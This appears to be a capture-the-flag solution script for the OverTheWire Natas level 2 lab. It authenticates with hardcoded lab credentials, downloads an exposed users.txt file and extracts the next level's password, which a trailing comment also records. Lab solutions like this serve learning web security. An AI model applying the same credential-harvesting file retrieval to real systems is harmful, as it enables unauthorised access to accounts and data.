# natas2

import requests
from pwn import log
import re

url = 'http://natas2.natas.labs.overthewire.org'
username = "natas2"
password = "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI"

def exploit():
    res = requests.get(url, auth=(username, password))
    res = requests.get(f'{url}/files/users.txt', auth=(username, password))
    flag = re.findall('.*natas3.*', res.text)
    log.info(flag)

if __name__ == '__main__':
    exploit()

# natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH